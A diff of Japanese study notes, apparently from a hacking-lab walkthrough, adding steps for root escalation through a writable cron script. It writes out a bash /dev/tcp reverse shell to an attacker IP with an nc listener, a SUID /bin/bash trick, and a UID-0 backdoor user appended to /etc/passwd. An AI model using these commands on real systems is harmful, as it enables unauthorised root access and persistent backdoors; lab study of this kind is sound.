@@ -36,7 +36,7 @@
   - ブラウザのURLのリンクに貼り付ける。スペースがないように気をつける
 
 - 完全な対話シェルにする
-  - `python -c 'import pty;pty.spawn("/bin/bash")'`
+  - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
   - `export TERM=xterm`
   - ctrl + z
   - `stty raw -echo ; fg`
@@ -56,17 +56,35 @@
   - `cat /var/www/html/finally.sh`
   - finally.shは書き込みができないので中の,write.shに書き込めるかチェックする
   - とりあえずファイルのところへ移動する。`cd /var/www/html`
-  - finally.shの中にwrite.shがある。5分ごとに実行されているのがわかる
+  - finally.shの中にwrite.shがある。5分ごとに実行されているのがわかる。他にwrite.shには./write.shで実行されているので、`#!/bin/sh`のシバンが消えていたら実行されないので注意
   - `write.sh`は`ls -l`でパーミッションを見たら書き込みできる
 - cronが、動いているのを確認する
   - `systemctl | grep cron` これがloaded active runningになっていたら動いている
   - または
-  - `journalctl -f` ここにrootで./finally.shが動いているのが確認できる  
+  - これをするときは完全なシェルでないとctrl+cを押すと抜けるので注意
+    - `journalctl -f` ここにrootで./finally.shが動いているのが確認できる。もし出てこなかったら何回か試してみる
 - cronの書き込みでroot取得の方法は3つ。ここでは(3)が楽なので、これでする
-- (1)バックドアをつける(ハッキングラボの7のevilboxのバックドアを仕込むに詳しく書いてある)
-- (2)reverse-shellでrootになる
-  - `bash -c 'exec bash -i &>/dev/tcp/192.168.56.104/9001 <&1'`
-- (3) bashをSUIDファイルにする
+
+- (1)reverse-shellでrootになる
+  - write.shに次のを書き込む
+  - `echo "bash -c 'exec bash -i &>/dev/tcp/192.168.56.104/9002 <&1'" >> write.sh`
+  - `nc -nlvp 9002`でParrotで待ち受ける
+- (2) bashをSUIDファイルにする
   - `echo 'chmod +s /bin/bash' >> write.sh`
   - `ls -l`でsになったら。次のコマンド
   - `/bin/bash -p`
+- (3) バックドアを仕込む(ハッキングラボの7のevilboxのバックドアを仕込むに詳しく書いてある)
+  - passwdファイルに自分のユーザ(root権限を持つ)を書き込んで、いつでも出入りできるようにする
+  - ParrotOS側でパスワードを作成する
+  - `openssl passwd -1 -salt usersalt`
+  - 自分で適当にpasswordを入れる、ここでは`pass`としておく
+  - `$1$usersalt$AdRPkkbvjFipmAjyOm.NT/`
+  - オプションの`-1`はmd5でハッシュアルゴリズム、ちなみに`-5`はsha256、`-salt`はソルト
+  - /etc/passwdはレコードごとにハッシュアルゴリズムが異なってもOK
+  - (補足)ハッシュアルゴリズムの-1は必要だが、-saltはなくてもいい
+  - パスワードをコピーしておく
+  - ターゲット側のターミナルで作成する。/etc/passwdに書き込む
+  - `>>`は追記なので注意 
+  - `echo 'eviluser:ペースト:0:0:root:/root:/bin/bash' >> /etc/passwd`
+  - フィールドの説明
+  - `ユーザ名:x:ユーザ番号:グループ番号:名前:ホームディレクトリ:利用シェル`
